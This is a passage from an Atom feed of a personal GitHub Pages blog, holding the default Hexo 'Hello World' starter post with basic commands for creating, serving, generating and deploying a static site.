    <link href="https://z2762331820.github.io/2020/10/06/hello-world/"/>
    <id>https://z2762331820.github.io/2020/10/06/hello-world/</id>
    <published>2020-10-06T08:07:10.988Z</published>
    <updated>2020-10-06T08:07:10.988Z</updated>
    
    <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;Welcome to &lt;a href=&quot;https://hexo.io/&quot;&gt;Hexo&lt;/a&gt;! This is your very first post. Check &lt;a href=&quot;https://hexo.io/docs/&quot;&gt;documentation&lt;/a&gt; for</summary>
      
    
    
    
    
  </entry>
  
</feed>
